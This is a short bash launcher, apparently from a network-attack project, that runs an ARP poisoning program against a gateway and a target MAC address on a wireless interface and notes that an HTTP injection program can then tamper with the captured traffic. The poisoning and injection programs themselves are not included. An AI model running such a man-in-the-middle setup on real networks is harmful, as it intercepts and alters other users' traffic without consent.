#!/bin/bash

echo "Please run as root!"

./setup.sh
./arp-poison.out wlp2s0b1 192.168.0.1 7c:d1:c3:dc:b7:27 a4:71:74:0f:46:0e
# at this time you can run `sudo ./http-inject.out 0' or `sudo ./http-inject.out 1' to capture from Queue0 or Queue1.
./setup.sh flushwhatever
